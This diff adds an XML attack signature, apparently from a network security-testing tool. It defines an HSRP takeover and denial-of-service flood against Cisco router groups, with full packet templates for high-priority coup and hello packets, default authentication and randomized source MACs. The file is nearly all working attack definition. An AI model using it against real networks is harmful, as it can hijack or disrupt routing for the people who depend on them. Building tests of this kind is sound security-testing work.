@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HSRP Takeover Attack"/>
+    <EngDesc display="true" value="This attack tries to take over a router group using HSRP by repeatedly sending out coup and hello packets with high priority. This can be used as a denial of service attack on the router group by specifying a nonexistent router."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="HSRP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Router"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.phenoelit.de/irpas/docu.html#hsrp"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Seth Hardy"/>
+    <ID display="true" value="00000104f9f8512600c000a80001003c383ddec6"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632726554529375000"/>
+    <SigStyle display="false" value="Flood"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="5"/>
+    <Regex display="false" value=""/>
+    <Created value="1139462077" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="virtualIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="group" type="ImperfectControls.HexField8Bit" value="null" index="F"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="@random(00:00:00:00:00:00,FF:FF:FF:FF:FF:FF)" destMac="01:00:5E:00:00:02" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0030" Identification="@random(0000,FFFF)" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="0FF6" srcIP="$sourceIP" destIP="224.0.0.2" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="1985" destPort="$destPort" checksum="0000" length="001C">
+          <HSRP Version="00" OpCode="01" State="10" Hellotime="03" Holdtime="FF" Priority="FF" Group="$group" Reserved="00" Authentication="636973636F000000" VirtualIP="$virtualIP"/>
+        </UDP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="@random(00:00:00:00:00:00,FF:FF:FF:FF:FF:FF)" destMac="01:00:5E:00:00:02" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0030" Identification="@random(0000,FFFF)" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="0FF5" srcIP="$sourceIP" destIP="224.0.0.2" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="1985" destPort="$destPort" checksum="0000" length="001C">
+          <HSRP Version="00" OpCode="00" State="10" Hellotime="03" Holdtime="FF" Priority="FF" Group="$group" Reserved="00" Authentication="636973636F000000" VirtualIP="$virtualIP"/>
+        </UDP>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
